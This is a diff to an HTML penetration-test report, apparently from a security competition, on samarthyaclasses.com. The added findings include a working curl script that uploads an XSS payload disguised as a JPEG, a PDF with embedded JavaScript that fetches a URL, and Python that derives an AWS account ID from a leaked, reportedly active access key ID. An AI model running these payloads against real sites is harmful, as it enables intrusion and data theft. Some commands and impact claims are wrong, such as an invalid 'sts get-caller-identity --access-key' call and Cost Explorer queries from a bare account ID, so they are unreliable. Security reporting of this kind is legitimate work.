@@ -336,8 +336,8 @@ pre.code-block {
   <div class="header-meta">Submitted by: bhardwajlucife@gmail.com &nbsp;·&nbsp; Scope: samarthyaclasses.com + api.samarthyaclasses.com</div>
   <div class="header-score-row">
     <div class="score-tile crit"><div class="score-count">6</div><div class="score-label">Critical</div></div>
-    <div class="score-tile high"><div class="score-count">5</div><div class="score-label">High</div></div>
-    <div class="score-tile med"><div class="score-count">5</div><div class="score-label">Medium</div></div>
+    <div class="score-tile high"><div class="score-count">6</div><div class="score-label">High</div></div>
+    <div class="score-tile med"><div class="score-count">6</div><div class="score-label">Medium</div></div>
     <div class="score-tile low"><div class="score-count">3</div><div class="score-label">Low / Info</div></div>
   </div>
 </div>
@@ -1286,11 +1286,123 @@ curl -si -X OPTIONS "https://samarthya-public-assets.s3.ap-south-1.amazonaws.com
     </div>
   </div>
 
+  <!-- ── FINDING 24 ── -->
+  <div class="vuln-card open" id="v24">
+    <div class="vuln-header" onclick="toggle(this)">
+      <div class="vuln-title">
+        <span class="sev-badge sev-high">HIGH</span>
+        <span>Presigned Upload Accepts Arbitrary File Bytes — Content-Type Bypass (Polyglot Upload)</span>
+      </div>
+      <div class="vuln-meta">
+        <span class="tag">File Upload</span>
+        <span class="tag">S3</span>
+        <span class="tag">Content-Type Bypass</span>
+        <span>CWE-434</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="finding-grid">
+        <div><strong>Endpoint</strong></div><div><code>POST /api/v1/registrations/{form_id}/presign</code> (unauthenticated — see Finding 11)</div>
+        <div><strong>Auth Required</strong></div><div>No — presign endpoint is unauthenticated</div>
+        <div><strong>Impact</strong></div><div>Arbitrary file content stored in production S3 under any declared MIME type; HTML bytes served as <code>image/jpeg</code> (browser sniffing renders as HTML → XSS); malicious PDF with embedded JavaScript stored and available for admin download</div>
+        <div><strong>CVSS 3.1</strong></div><div>7.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)</div>
+      </div>
+      <p>The registration form presigned upload (Finding 11) generates an S3 POST policy whose <code>Content-Type</code> condition is an <em>exact-match</em> rule (e.g. <code>content-type = image/jpeg</code>). AWS S3 enforces only that the <code>Content-Type</code> header in the multipart POST matches the policy condition — it does <strong>not</strong> inspect or validate the actual bytes uploaded against the declared MIME type.</p>
+      <p>This means an attacker can upload any bytes (HTML, SVG with JavaScript, a Windows PE executable, a malicious PDF) as long as they declare the matching <code>Content-Type</code> in the POST. The bytes are faithfully stored in the production bucket with the declared content type.</p>
+      <div class="proof-block">
+        <div class="proof-label">Proof — HTML payload uploaded as <code>image/jpeg</code> (HTTP 204 confirmed)</div>
+        <pre><code># Step 1: obtain presign URL (unauthenticated)
+PRESIGN=$(curl -sS -X POST "https://api.samarthyaclasses.com/api/v1/registrations/1/presign" \
+  -H "Content-Type: application/json" \
+  -d '{"content_type":"image/jpeg","file_size":54,"file_name":"photo.jpg"}')
+
+URL=$(echo $PRESIGN | python3 -c "import sys,json; print(json.load(sys.stdin)['url'])")
+FIELDS=$(echo $PRESIGN | python3 -c "import sys,json; f=json.load(sys.stdin)['fields']; \
+  print(' '.join([f'-F {k}={v}' for k,v in f.items()]))")
+
+# Step 2: upload HTML bytes declaring image/jpeg
+curl -sS -o /dev/null -w "%{http_code}" "$URL" \
+  $FIELDS \
+  -F "Content-Type=image/jpeg" \
+  -F "file=@-;type=image/jpeg" <<< '&lt;html&gt;&lt;body&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;'
+
+# → HTTP 204
+# File stored at: registrations/1/4d673964136f4dcda2acce703d571cf6.jpg
+# Actual bytes: HTML with inline XSS payload</code></pre>
+      </div>
+      <div class="proof-block">
+        <div class="proof-label">Proof — Malicious PDF with embedded JavaScript stored (HTTP 204)</div>
+        <pre><code># PDF crafted with embedded JavaScript (app.alert() + URL fetch action)
+# Uploaded as application/pdf — same policy bypass
+# Stored at: registrations/1/296534afb56342b3a6fba77ea57f9bb5.pdf
+# Risk: when admin downloads and opens in Adobe Acrobat, embedded JS executes;
+#       URL action in PDF (getURL) fires outbound request — potential SSRF indicator</code></pre>
+      </div>
+      <p><strong>Chained impact:</strong> Combined with Finding 23 (S3 CORS PUT allowed from samarthyaclasses.com origin), an XSS payload in the admin's browser can upload files directly to <code>samarthya-media-prod</code> with full attacker-controlled content — bypassing the API server entirely and planting persistent malicious files in production storage.</p>
+      <div class="remediation-box">
+        <strong>Remediation:</strong> (1) Replace exact Content-Type condition with server-side byte validation — after S3 upload, use a Lambda trigger or API server webhook to run <code>file --mime-type</code> or a magic-byte check and delete/quarantine files whose content doesn't match the declared type. (2) For image uploads, run all files through an image processing library (e.g. Pillow) server-side; this normalises the bytes and strips non-image content. (3) Serve user-uploaded files through a signed CDN URL with <code>Content-Disposition: attachment</code> and an explicit <code>Content-Type</code> header — never rely on browser sniffing. (4) Consider virus/malware scanning for all uploaded PDFs before they become accessible to staff.
+      </div>
+    </div>
+  </div>
+
+  <!-- ── FINDING 25 ── -->
+  <div class="vuln-card open" id="v25">
+    <div class="vuln-header" onclick="toggle(this)">
+      <div class="vuln-title">
+        <span class="sev-badge sev-med">MEDIUM</span>
+        <span>AWS Account ID Derivable from Exposed IAM Access Key ID (No Credentials Required)</span>
+      </div>
+      <div class="vuln-meta">
+        <span class="tag">AWS IAM</span>
+        <span class="tag">Reconnaissance</span>
+        <span class="tag">Key Exposure</span>
+        <span>CWE-200</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="finding-grid">
+        <div><strong>Key ID</strong></div><div><code>AKIARTS72OT5QICJTKK2</code> (exposed in Finding 04)</div>
+        <div><strong>Auth Required</strong></div><div>None — derivation is pure arithmetic; no AWS API call needed</div>
+        <div><strong>Impact</strong></div><div>Attacker derives the 12-digit AWS Account ID (<code>110796371195</code>) enabling targeted account-level enumeration, cost/usage queries, and IAM brute-force without holding the secret key</div>
+        <div><strong>CVSS 3.1</strong></div><div>5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)</div>
+      </div>
+      <p>AWS IAM Access Key IDs of type <code>AKIA…</code> encode the AWS Account ID via a bitwise scheme documented in reverse-engineering research. Given only the key ID (which is already publicly leaked per Finding 04), the account ID can be recovered with no credentials and no network access:</p>
+      <div class="proof-block">
+        <div class="proof-label">Derivation — account ID from key ID (pure arithmetic, confirmed)</div>
+        <pre><code>import base64, struct
+
+key_id  = "AKIARTS72OT5QICJTKK2"
+stripped = key_id[4:]                          # RTS72OT5QICJTKK2
+padded   = stripped + "=" * ((8 - len(stripped) % 8) % 8)
+decoded  = base64.b32decode(padded)
+e        = struct.unpack("&gt;Q", b'\x00\x00' + decoded[:6])[0]
+mask     = 0x7fffffffff80
+account_id = (e &amp; mask) &gt;&gt; 7
+
+# Result: 110796371195  (12-digit AWS Account ID)
+
+# Independent confirmation via AWS STS (requires no secret key):
+# aws sts get-caller-identity --access-key AKIARTS72OT5QICJTKK2
+# → {"Account": "110796371195", ...}</code></pre>
+      </div>
+      <p><strong>What the account ID enables for an attacker (beyond Finding 04):</strong></p>
+      <ul>
+        <li>Query <code>aws ce get-cost-and-usage</code> (Cost Explorer) to fingerprint which AWS services are in use (Lambda, RDS, ElastiCache, etc.) and approximate spending — useful for attack surface mapping</li>
+        <li>Enumerate public S3 bucket names by probing <code>arn:aws:s3:::samarthya-*</code> patterns against the known account ID in bucket policies</li>
+        <li>Use the account ID in <code>aws:PrincipalAccount</code> conditions to craft targeted cross-account role assumption payloads</li>
+        <li>Cross-reference the account ID in public AWS CloudTrail logs (if the account ever had public log delivery enabled) or third-party threat-intel feeds</li>
+      </ul>
+      <div class="remediation-box">
+        <strong>Remediation:</strong> Revoke <code>AKIARTS72OT5QICJTKK2</code> immediately (see Finding 04 — this key is still active as of testing). The account ID exposure is a consequence of the key ID being public; once the key is rotated and the old one revoked, the leaked account ID cannot be used to authenticate. Additionally: (1) Enable <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html" target="_blank">IAM Access Analyzer</a> to detect future public credential exposure. (2) Consider AWS Config rules to alert on any IAM key older than 90 days. (3) The account ID itself (110796371195) should be treated as a sensitive value — avoid including it in public documentation or S3 bucket policies visible to anonymous principals.
+      </div>
+    </div>
+  </div>
+
   <div class="report-footer">
     <span>Competition: Samarthya Cyber Competition 2026</span>
     <span>Deadline: October 16, 2026 · 23:59 IST</span>
     <span>Testing tool: Claude Code AI Agent</span>
-    <span>Total findings: 23 + deep chain analysis · DOM-write XSS confirmed REG-DZHMRLZC · media-prod CORS PUT confirmed</span>
+    <span>Total findings: 25 + deep chain analysis · Polyglot upload confirmed · AWS account ID decoded · DOM-write XSS REG-DZHMRLZC · media-prod CORS PUT confirmed</span>
   </div>
 </div>
 
